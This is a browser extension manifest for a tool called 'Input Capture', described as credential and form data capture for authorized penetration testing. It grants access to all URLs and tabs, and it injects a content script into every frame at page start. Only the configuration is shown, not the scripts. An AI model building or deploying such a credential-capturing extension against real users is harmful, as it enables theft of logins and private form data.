{
  "manifest_version": 2,
  "name": "Input Capture",
  "version": "1.0.0",
  "description": "Credential and form data capture for authorized penetration testing",
  "permissions": [
    "storage",
    "http://*/",
    "https://*/",
    "tabs",
    "webNavigation",
    "<all_urls>"
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "all_frames": true,
      "run_at": "document_start",
      "match_about_blank": true
    }
  ],
  "background": {
    "scripts": ["background.js"],
    "persistent": true
  },
  "web_accessible_resources": [
    "inject.js"
  ],
  "icons": {
    "48": "icon.png"
  }
}
